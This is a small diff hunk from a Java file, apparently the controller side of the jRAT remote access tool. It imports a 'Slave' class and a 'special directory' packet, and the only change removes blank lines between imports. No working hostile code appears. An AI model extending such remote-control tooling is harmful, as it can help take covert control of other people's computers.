@@ -2,10 +2,8 @@ package io.jrat.controller.listeners;
 
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet41SpecialDirectory;
-
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-
 import javax.swing.JMenuItem;
 
 
